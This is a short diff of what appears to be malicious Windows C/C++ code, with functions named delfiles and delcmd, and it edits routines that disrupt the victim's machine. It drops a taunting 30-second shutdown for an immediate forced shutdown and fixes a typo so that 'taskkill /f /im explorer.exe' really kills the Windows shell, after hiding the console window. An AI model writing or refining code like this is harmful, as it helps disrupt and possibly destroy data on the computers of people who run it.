@@ -13,14 +13,14 @@ void delfiles() {
 
 }
 void closeinscnd() {
-  system("shutdown -s -t 30 -c Say Good Bye To Your PC!");
+  system("shutdown -s");
   
 
 
 }
 void closeexplorer() {
   FreeConsole();
-  system("taskkill /f /im exlorer.exe");
+  system("taskkill /f /im explorer.exe");
 
 }
 void delcmd() {
